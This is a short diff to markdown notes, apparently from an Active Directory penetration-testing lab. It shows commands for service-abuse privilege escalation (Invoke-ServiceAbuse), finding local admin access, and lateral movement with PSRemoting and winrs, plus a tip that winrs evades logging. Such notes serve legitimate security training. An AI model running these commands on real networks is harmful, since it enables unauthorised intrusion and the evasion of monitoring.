@@ -50,12 +50,9 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose  
 Find-PSRemotingLocalAdminAccess
 
 #you can connect to the other computer using the following command
-ENTER-PSSession -ComputerName dcorp-adminsrv
 winrs -r:dcorp-adminsrv cmd
 set username
 set computername
-
-
 ```
 
 # Lateral Movement 
@@ -65,7 +62,7 @@ One-To-One
 Enter-PSSession -ComputerName <dcorp-adminsrv>
 #After getting the access run `whomai` to get the username, run `hostname` to get the pc name
 
-Using Invoke-Command
+Using Invoke-Command   #To send command to a machine
 Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName dcorp-mgmt
 
 #you can use winrs in place of PSRemoting to evade the logging (more stealthy)
